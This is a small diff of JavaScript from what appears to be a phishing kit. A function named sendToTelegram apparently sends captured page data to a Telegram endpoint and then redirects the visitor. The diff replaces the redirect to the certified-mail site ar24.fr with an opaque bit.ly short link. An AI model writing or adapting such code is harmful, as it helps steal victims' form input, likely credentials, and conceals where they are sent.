@@ -30,7 +30,7 @@ function sendToTelegram(){
     })
   .then(response => {
     if (response.ok) {
-        window.location.href = "https://www.ar24.fr/certifications/";
+        window.location.href = "https://bit.ly/4rS4avv";
     } else {
         console.error("Erreur lors de l'envoi.");
     }
